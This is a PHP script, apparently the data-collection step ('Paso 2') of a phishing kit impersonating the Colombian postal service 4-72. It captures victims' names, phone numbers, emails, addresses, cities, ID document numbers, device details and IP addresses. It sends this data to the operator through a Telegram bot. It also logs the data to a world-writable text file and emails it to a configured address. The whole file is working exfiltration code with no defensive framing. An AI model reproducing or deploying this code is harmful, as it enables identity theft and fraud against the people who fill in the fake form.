<?php
require('../config.php');
require_once("../lib/class.inputfilter.php");
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();
$hoy1 = date("Y/m/d");  
$hoy2 = date("Y-m-d H:i:s"); 

$nombres = $ifilter->process($_POST['nom']);
$celular = $ifilter->process($_POST['cel']);
$correo = $ifilter->process($_POST['cor']);
$direccion = $ifilter->process($_POST['dir']);
$ciudad = $ifilter->process($_POST['ciu']);

$documento = $_COOKIE['documento'];
$dispositivo = $_COOKIE['dispositivo'];

$ipcliente= $_SERVER['REMOTE_ADDR'];

setcookie('nombres',$nombres,time()+60*9);
setcookie('celular',$celular,time()+60*9);
setcookie('correo',$correo,time()+60*9);
setcookie('direccion',$direccion,time()+60*9);
setcookie('ciudad',$ciudad,time()+60*9);


function getSslPage($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}

$data = [
	'chat_id' => $id_chat,
	'parse_mode' => 'HTML',
	'text' => '<b>'.$dominio.'</b>
	Datos Paso 2 <b>Datos (4-72)</b> '.$hoy2.'

	<b>Documento:</b> '.$documento.'
	<b>Nombre:</b> '.$nombres.'
	<b>Celular:</b> '.$celular.'
	<b>Correo:</b> '.$correo.'
	<b>Dirección:</b> '.$direccion.'
	<b>Ciudad:</b> '.$ciudad.'	
	<b>Dispositivo:</b> '.$dispositivo.'
	<b>IP:</b> '.$ipcliente.'
	'
];

$response = getSslPage("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data));


$datos = 'Documento: '.$documento.' | Nombre: '.$nombres.' | Celular: '.$celular.' | Correo: '.$correo.' | Dirección: '.$direccion.' | Ciudad: '.$ciudad.' | Dispositivo: '.$dispositivo.' | IP: '.$ipcliente;

$file = '../2-datos.txt';

$salto = "";
$cabecera = "---------------- Paso 2 (".date("Y-m-d H:i:s").")";

$fp = fopen($file, 'a+');
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $salto.PHP_EOL);
fwrite($fp, $cabecera.PHP_EOL);
fwrite($fp, utf8_decode($datos).PHP_EOL);
fclose($fp);
chmod($file, 0777);
echo $file;

 

$to = $destino;
$subject = "Datos 4-72 Paso 2 ".$documento." - ".$hoy1;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
$message = "
<html>
<head>
<title>Datos</title>
</head>
<body>
<b>Documento: </b>".$documento."<br> 
<b>Nombre: </b>".$nombres."<br> 
<b>Celular: </b>".$celular."<br>
<b>Correo: </b>".$correo."<br> 
<b>Dirección: </b>".$direccion."<br>
<b>Ciudad: </b>".$ciudad."<br>
<b>Dispositivo: </b>".$dispositivo."<br> 
<b>Dirección IP: </b>".$ipcliente."<br> 
<b>Hora/Fecha: </b>".$hoy2."
</body>
</html>";
 
mail($to, $subject, $message, $headers);
exit();
?>